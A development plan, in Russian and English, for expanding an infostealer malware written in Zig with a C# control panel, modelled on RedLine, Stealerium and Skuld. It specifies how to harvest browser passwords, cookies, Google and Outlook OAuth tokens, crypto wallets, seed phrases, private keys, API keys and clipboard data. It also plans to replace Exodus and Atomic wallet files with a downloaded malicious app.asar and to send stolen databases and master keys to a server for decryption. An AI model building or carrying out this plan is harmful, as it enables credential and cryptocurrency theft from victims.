# Phase 10: Data Theft Expansion — Implementation Plan

**Цель:** Расширение покрытия кражи данных: динамическое сканирование браузеров, OAuth токены, криптокошельки, расширенный сбор системы, regex-граббер, Server-Side Processing.
**Всего задач:** 39 | **Оценка:** ~8 дней | **Сложность:** Средняя-Высокая

---

## Dependency Map

```
10.1 Dynamic Browser Scan (фундамент)
  └─ Независим — можно делать первым

10.2 OAuth (Google + Outlook)
  ├─ Зависит от 10.1 (нужен browser_scanner для поиска профилей)
  └─ Использует существующий chrome_key (Local State парсер)

10.3 Wallets
  ├─ wallet_extensions: просто добавить ID (независимо)
  ├─ wallet_desktop: добавить пути (независимо)
  └─ wallet_inject: зависит от NtCreateThreadEx (есть в 9.1)

10.4 System Expansion
  ├─ processes: NtQuerySystemInformation (сисколл есть)
  ├─ applications: registry (NtOpenKey есть)
  ├─ clipboard: user32/GDI (hash-resolution)
  ├─ launch_info: GetModuleFileName + NtQueryInformationProcess
  └─ grabber rewrite: полная переработка

10.5 Regex Grabber
  └─ Независим, читает файлы через file_io.zig

10.6 Server-Side Processing (SSP)
  ├─ Stealer side: копирование .db (file_io уже есть)
  ├─ Panel side: C# SQLite парсинг + AES-GCM расшифровка
  └─ Нужны новые модели/таблицы в DB
```

---

## 10.1 Browser — Dynamic Scan (5 задач, ~1.5 дня)

### 10.1.1 Dynamic Browser Scanner (`browsers/browser_scanner.zig`)

**Что делает:** Вместо хардкода 46 путей — сканирование директорий на наличие профилей браузеров.

**Алгоритм:**
```
1. LOCALAPPDATA:
   Для каждой поддиректории в %LOCALAPPDATA%:
     Проверить наличие "User Data\Local State"
     Если есть → это Chromium браузер
     Определить имя из имени папки
     Найти все профили (Default, Profile N)

2. APPDATA:
   Для каждой поддиректории в %APPDATA%:
     Проверить наличие "profiles.ini" или "Profiles\" каталога
     Если есть → это Gecko браузер

3. Portable браузеры:
   Проверить диск C: на папки с браузерами (Chrome, Firefox и т.д.)
```

**Референсы в raw/:**
- `SentinelStealer\Recovery\Extensions\BrowserHelpers.cs` — `ListBrowsers()` 2-level DFS scan
- `SentinelStealer\Recovery\Services\Browsers\Chromium.cs` — `ListProfiles()`
- `RedLineStealer\Logic\Helpers\DecryptHelper.cs` — `FindPaths()` recursive

**Файлы:**
- `src/browsers/browser_scanner.zig` — новый

**Тесты:**
- Сканирование несуществующей директории → пустой результат
- Сканирование с известной структурой → находит профили

---

### 10.1.2 Chromium paths — расширение до 70+

**Добавить в `chromium_paths.zig`:**
```
Chrome Canary, Chrome Dev, Chrome Beta
Edge Beta, Edge Dev, Edge Canary
Brave Beta, Brave Nightly
Opera Beta, Opera Crypto
CryptoTab, Avast Secure, CCleaner, UC Browser
QQ Browser, 360 Browser, Liebao
Elements, Superbird, Sleipnir, Mail.ru Atom
```

**Референс:** `skuld\modules\browsers\paths.go` — 42 Chromium пути

---

### 10.1.3 Gecko paths — расширение до 30+

**Добавить в `firefox_paths.zig`:**
```
Firefox Beta, Firefox Nightly, Firefox Dev
Waterfox Classic, Waterfox Current
LibreWolf, Floorp, GNU IceCat
Basilisk
```

---

## 10.2 Browser — Google & MS OAuth (4 задачи, ~2 дня)

### 10.2.1 Google Tokens (`browsers/google_tokens.zig`)

**Что делаем:** Извлечение Google OAuth Refresh Tokens из Chrome's Token Service.

**Алгоритм:**
```
1. Найти Web Data SQLite через browser_scanner
2. Прочитать таблицу token_service:
   - Колонка 0: GAIA ID (AccountId-*)
   - Колонка 1: encrypted_token (AES-GCM или DPAPI)
3. Расшифровать:
   - Получить мастер-ключ из Local State (существующий chrome_key)
   - AES-GCM decrypt (существующий chrome_crypto)
4. Формат вывода:
   Account ID: {gaia_id}
   Token: {decrypted_token}:{gaia_id}
5. MultiLogin: собрать все GAIA ID через запятую
```

**Референсы в raw/:**
- `SentinelStealer\Recovery\Services\Browsers\Chromium.cs` — строки 208-217: `FormatGoogleToken()`
- `DumpBrowserSecrets\ExtractChromiumData.cpp` — `ExtractRefreshTokenFromDatabase()`

**Файлы:**
- `src/browsers/google_tokens.zig` — новый

**Тесты:**
- Парсинг mock token_service таблицы
- Расшифровка с известным ключом
- Пустая таблица → пустой результат

---

### 10.2.2 Outlook OAuth Tokens (`browsers/outlook_tokens.zig`)

**Три метода:**

**Method A — MSAL Cache:**
```
1. Сканировать %LOCALAPPDATA%\Microsoft\OneAuth\msal.cache
2. Это SQLite: таблица cache (key TEXT, value BLOB)
3. value — DPAPI-encrypted JSON
4. Расшифровать через CryptUnprotectData
5. Извлечь refresh_token, access_token, account_id
```

**Method B — Windows Credential Manager:**
```
1. vaultcli.dll → CredEnumerateW("WindowsLive:*")
2. Извлечь raw OAuth токены
```

**Method C — Classic Outlook Registry:**
```
1. HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\
2. Читать SMTP, POP3, IMAP пароли
3. DPAPI расшифровка
```

**Референсы в raw/:**
- `SentinelStealer\Recovery\Services\Mail\Outlook.cs` — OAuth + registry
- `Stealerium\Stub\Target\Messengers\Outlook.cs` — registry credentials

**Файлы:**
- `src/browsers/outlook_tokens.zig` — новый

---

### 10.2.3 Chromium Local Storage (`browsers/chromium_localstorage.zig`)

**Алгоритм:**
```
Для каждого профиля браузера:
   Local Storage\leveldb\ — вся LevelDB директория
   Session Storage\ — вся директория
Скопировать все файлы в архив
```

**Файлы:**
- `src/browsers/chromium_localstorage.zig` — новый

---

## 10.3 Wallets — Расширение (7 задач, ~2 дня)

### 10.3.1 Extension Wallets — Add (+20 ID в `wallet_extensions.zig`)

| Группа | Кошельки |
|--------|----------|
| Новые | Slope, Rise, HaloWallet, FuelWallet, Lace, DPal, Alby, HOT |
| 2FA | 2FAS, 2FAAuthenticator |
| PM | KeepassXC, Norton PM, Avira PM, Passky PM, Padloc PM |
| Notes | Notion, Evernote, OneNote, Google Keep |

**Референс:** `skuld\modules\wallets\wallets.go` — 55 ID

---

### 10.3.2 Desktop Wallets — Expand (`wallet_desktop.zig`, +11 путей)

| Wallet | Path (из %APPDATA%) | Файлы |
|--------|---------------------|-------|
| Bitcoin Core | `\Bitcoin\` | `wallet.dat`, `bitcoin.conf` |
| Litecoin Core | `\Litecoin\` | `wallet.dat` |
| Dogecoin Core | `\DogeCoin\` | `wallet.dat` |
| Dash Core | `\DashCore\` | `wallet.dat` |
| Armory | `\Armory\` | `*.wallet` |
| Bytecoin | `\bytecoin\` | `*.wallet` |
| MultiDoge | `\MultiDoge\` | `multidoge.wallet` |
| ElectrumLTC | `\Electrum-LTC\` | `wallets\*` |
| ElectronCash | `\ElectronCash\` | `wallets\*` |
| Zcoin/Firo | `\Firo\` | `wallet.dat` |
| BitcoinGold | `\BitcoinGold\` | `wallet.dat` |

**Референс:** `ferrox\src\wallet\desktop_apps.rs` — 18 wallets с file patterns

---

### 10.3.3 Wallet Injection (`wallets/wallet_inject.zig`)

**Алгоритм:**
```
Exodus: %LOCALAPPDATA%\exodus\app-*\resources\app.asar
Atomic: %LOCALAPPDATA%\Programs\atomic\resources\app.asar
1. HTTP GET malicious app.asar
2. NtCreateFile → NtWriteFile → overwrite app.asar
3. Webhook URL в LICENSE файл
```

**Референс:** `skuld\modules\walletsinjection\walletsinjection.go`

**Файлы:**
- `src/wallets/wallet_inject.zig` — новый

---

## 10.4 System — Расширение (6 задач, ~2 дня)

### 10.4.1 Running Processes (`system/processes.zig`)
- **Метод:** NtQuerySystemInformation(SystemProcessInformation)
- **Вывод:** PID + имя процесса
- **Файл:** `src/system/processes.zig`

### 10.4.2 Installed Applications (`system/applications.zig`)
- **Метод:** Registry NtOpenKey:
  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
  - HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
- **Вывод:** DisplayName, Version, Publisher
- **Референс:** RedLineStealer UserInfoHelper.cs
- **Файл:** `src/system/applications.zig`

### 10.4.3 Clipboard Capture (`system/clipboard.zig`)
- **Метод:** OpenClipboard → GetClipboardData(CF_UNICODETEXT) → CloseClipboard
- **Референс:** Stealerium ClipboardManager.cs
- **Файл:** `src/system/clipboard.zig`

### 10.4.4 Launch Info (`system/launch_info.zig`)
- **Метод:** GetModuleFileNameW + NtQueryInformationProcess
- **Вывод:** путь EXE, режим запуска (Disk/Memory)
- **Файл:** `src/system/launch_info.zig`

### 10.4.5 GPU Details — расширение (`hardware.zig`)
- **Добавить:** DriverVersion, VRAM размер из реестра GPU

### 10.4.6 Grabber Rewrite (`grabber.zig` — полная переработка)

**Новый формат правил:**
```zig
const GrabRule = struct {
    base_path: []const u8,
    include_masks: []const []const u8,
    exclude_masks: []const []const u8,
    max_depth: u32,
    max_file_size: usize,
    dedup_cache: bool,
};
```

---

## 10.5 Regex-граббер (4 задачи, ~1.5 дня)

### 10.5.1 BIP39 Seed Scanner (`system/regex_grabber.zig`)
- BIP39 wordlist → hash set (2048 слов)
- Сканирование .txt/.doc/.docx файлов в памяти
- Поиск последовательностей 12/18/24 слов
- Валидация checksum

### 10.5.2 Private Key Scanner
- BTC WIF: `\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b`
- ETH hex: `\b0x[0-9a-fA-F]{64}\b`
- SOL base58: `\b[1-9A-HJ-NP-Za-km-z]{87,88}\b`
- XMR: `\b[0-9a-fA-F]{64}\b`

### 10.5.3 API Keys / JWT Scanner
- API keys: `api[_-]?key[:=]["']?([A-Za-z0-9_\-]{16,64})`
- JWT: `eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}`
- AWS keys: `AKIA[0-9A-Z]{16}`

### 10.5.4 In-Memory Only
- Все сканирование через `file_io.zig` (mapped files)
- Никаких временных файлов

---

## 10.6 Server-Side Processing (SSP) — 7 задач, ~3 дня

### 10.6.1-3 Stealer Side (`browsers/ssp.zig`)

**Алгоритм:**
```
Для каждого профиля браузера:
  1. Скопировать: Login Data, Cookies, Web Data, History, Local State
  2. Извлечь мастер-ключ из Local State
  3. Упаковать в ZIP: .db файлы + ключ + metadata
  4. Отправить на сервер
```

**Изменения в `config.zig`:** `pub const ENABLE_SSP: bool = false;`
**Изменения в `chromium.zig`:** если ENABLE_SSP → вызывать ssp.collect()

### 10.6.4-6 Panel Side (`Panel/Services/ServerSideDecryptor.cs`)

**Алгоритм:**
```
1. Получить ZIP от билда
2. Извлечь .db файлы + мастер-ключ
3. Microsoft.Data.Sqlite для чтения SQLite
4. Расшифровка:
   - AES-GCM (v10/v11) → AesGcm .NET
   - DPAPI → DataProtection.Unprotect
   - App-Bound → ключ расшифрован на билде
5. Сохранить в Session/Password/Cookie/Wallet
```

**NuGet:** `Microsoft.Data.Sqlite`

---

## Execution Order

```
Day 1: 10.1 (browser_scanner + paths expansion)
Day 2: 10.2 (google_tokens + outlook_tokens + localstorage)
Day 3: 10.3 (wallet_extensions + wallet_desktop + wallet_inject)
Day 4: 10.4 (processes + applications + clipboard + launch_info + grabber)
Day 5: 10.5 (regex_grabber — BIP39 + private keys + API keys)
Day 6-7: 10.6 (ssp.zig + ServerSideDecryptor.cs + config)
Day 8: Integration + 30+ tests
```

---

## Files Summary

### Новые файлы (13):
| File | Референс в raw/ |
|------|-----------------|
| `browsers/browser_scanner.zig` | SentinelStealer BrowserHelpers.cs |
| `browsers/google_tokens.zig` | SentinelStealer Chromium.cs |
| `browsers/outlook_tokens.zig` | SentinelStealer Outlook.cs |
| `browsers/chromium_localstorage.zig` | — |
| `browsers/ssp.zig` | TheBear (raw file send) |
| `wallets/wallet_inject.zig` | skuld walletsinjection.go |
| `system/processes.zig` | SentinelStealer Methods.cs |
| `system/applications.zig` | RedLineStealer UserInfoHelper.cs |
| `system/clipboard.zig` | Stealerium ClipboardManager.cs |
| `system/launch_info.zig` | — |
| `system/regex_grabber.zig` | — (новый) |
| `Panel/Services/ServerSideDecryptor.cs` | — (новый) |

### Модифицируемые файлы (8):
| File | Изменения |
|------|-----------|
| `browsers/chromium_paths.zig` | +30 путей (до 70+) |
| `browsers/firefox_paths.zig` | +20 путей (до 30+) |
| `wallets/wallet_extensions.zig` | +20 IDs |
| `wallets/wallet_desktop.zig` | +11 путей |
| `system/hardware.zig` | +GPU driver, VRAM |
| `system/grabber.zig` | Полная переработка |
| `system/system_info.zig` | +processes, applications, clipboard |
| `config/config.zig` | +ENABLE_SSP |
| `browsers/chromium.zig` | +SSP branch |
